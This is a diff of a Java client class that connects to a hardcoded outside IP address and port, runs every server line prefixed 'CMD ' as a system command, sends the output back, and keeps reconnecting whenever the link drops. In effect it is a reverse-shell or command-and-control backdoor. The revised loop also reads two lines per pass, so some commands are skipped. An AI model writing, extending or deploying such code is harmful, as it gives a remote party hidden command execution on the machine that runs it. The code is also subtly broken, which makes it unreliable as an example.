@@ -7,9 +7,6 @@ public class Client {
     private static String HOST = "141.219.247.5";
     private static int PORT = 22122;
     private PrintWriter out;
-    private BufferedReader in;
-    private Socket socket;
-    private String comm;
 
     public static String getHOST() {
         return HOST;
@@ -32,24 +29,26 @@ public class Client {
     }
 
     private void connect() {
-//        loadServerSettings();
-        try {
-            socket = new Socket(getHOST(), getPORT());
-            out = new PrintWriter(socket.getOutputStream());
-            out.flush();
-            in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
+        try{
+            Socket socket = new Socket(getHOST(), getPORT());
+            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
+            out = new PrintWriter(socket.getOutputStream(),true);
             System.out.println("Client started: " + getHOST() + ":" + getPORT());
-            do {
-                comm = in.readLine();
-                if (comm.contains("CMD ")) {
-                    exec(comm.replace("CMD ", ""));
+            String comm = "";
+            if(socket.isConnected()) {
+                while((comm = in.readLine())!=null && !comm.contains("forciblyclose")) {
+                    comm = in.readLine();
+                    if (comm.contains("CMD ")) {
+                        exec(comm.replace("CMD ", ""));
+                    }
+                    if (comm.equals("forciblyclose")) {
+                        out.println("forciblyclose");
+                    }
                 }
-                if(comm.equals("forciblyclose")){
-                    out.println("forciblyclose");
-                }
-            } while (!comm.equals("forciblyclose"));
-
-        } catch (IOException e1) {
+            } else {
+                connect();
+            }
+        } catch (IOException e) {
             System.out.println("Disconnected... retrying.");
             connect();
         }
@@ -57,7 +56,6 @@ public class Client {
 
     private void communicate(String msg) {
         out.println(msg);
-        out.flush();
     }
 
     private void exec(String command) throws IOException {
@@ -69,7 +67,6 @@ public class Client {
             BufferedReader stdError = new BufferedReader(new
                     InputStreamReader(p.getErrorStream()));
             String s;
-            System.out.println("HA");
             while ((s = stdInput.readLine()) != null) {
                 communicate(s);
                 System.out.println(s);
@@ -95,7 +92,7 @@ public class Client {
                 setHOST(settings[0]);
                 setPORT(Integer.parseInt(settings[1]));
             }
-        } catch (IOException e) {
+        } catch (IOException ignored) {
         }
     }
 }
